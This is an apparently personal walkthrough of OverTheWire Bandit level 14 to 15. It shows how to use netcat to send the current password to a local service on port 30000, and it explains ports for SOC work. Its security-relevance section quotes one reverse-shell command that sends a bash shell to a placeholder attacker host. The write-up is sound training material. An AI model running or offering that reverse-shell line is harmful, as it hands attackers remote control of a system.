# Bandit Level 14 → Level 15

## 🎯 Goal

The password for the next level can be retrieved by submitting the password of the current level (bandit14) to **port 30000** on `localhost`.

**Connect with:** `ssh bandit14@bandit.labs.overthewire.org -p 2220`

---

## 🧠 What I Learned

- How to communicate with a listening network service using `netcat` (`nc`)
- The concept of ports and how services listen on them
- How to read a file and send its contents over a network connection
- Basic client-server interaction on the command line

---

## 🛠 Commands Used

```bash
# Get the current password (needed to send)
cat /etc/bandit_pass/bandit14

# Connect to the service on port 30000 and send the password
echo "$(cat /etc/bandit_pass/bandit14)" | nc localhost 30000

# Alternative: interactive netcat session
nc localhost 30000
# Then type/paste the password and press Enter
```

---

## 🔍 Step-by-Step Explanation

**Step 1 — Get the current level's password**

```bash
cat /etc/bandit_pass/bandit14
```

This reveals bandit14's password, which is what the service on port 30000 wants.

**Step 2 — Understand the network service model**

On a computer, a **port** is a numbered endpoint for network communication (0–65535). Services "listen" on ports waiting for connections. For example:
- Port 22 — SSH
- Port 80 — HTTP
- Port 443 — HTTPS
- Port 30000 — custom Bandit service (on this server)

**Step 3 — Connect with `netcat`**

`netcat` (`nc`) is often called the "Swiss Army knife" of networking. It can:
- Open TCP/UDP connections to any host and port
- Listen for incoming connections
- Send and receive data over the network

Send the password directly:

```bash
echo "$(cat /etc/bandit_pass/bandit14)" | nc localhost 30000
```

Or connect interactively:
```bash
nc localhost 30000
```
Then type the password and press Enter.

The server responds:
```
Correct!
The password for bandit15 is: <the_next_password>
```

---

## 🔐 Cybersecurity / SOC Relevance

Understanding ports and network services is foundational for SOC Analysts. Every incoming alert involves a source IP, destination IP, and port number. Knowing what services commonly run on which ports (and what's unusual) is critical:

- **netcat** is both a legitimate admin tool and an attacker's tool — it's commonly used to:
  - Create reverse shells: `nc -e /bin/bash attacker-ip 4444`
  - Transfer files between systems
  - Set up backdoor listeners
- **Port scanning** (with `nmap`) is the first step in network reconnaissance
- **Unusual open ports** on internal hosts are high-priority alerts in a SOC environment

Recognizing a `nc` process in logs (`/proc/<pid>/cmdline`) or in process lists should raise immediate suspicion during an investigation.

---

## 💡 Key Takeaways

- `nc host port` opens a TCP connection to the specified host and port
- Data typed (or piped) into `nc` is sent to the remote service; responses are printed to your terminal
- Ports are how operating systems route network traffic to the right application
- `netcat` is powerful but flagged as suspicious when found on production systems

---

## ❌ Common Mistakes

- **Sending the wrong password** — bandit14's password must be read from `/etc/bandit_pass/bandit14`, not recalled from memory
- **Connecting to the wrong host** — use `localhost` (or `127.0.0.1`) since the service is on the same machine
- **Not pressing Enter** — in interactive mode, the service waits for newline-terminated input
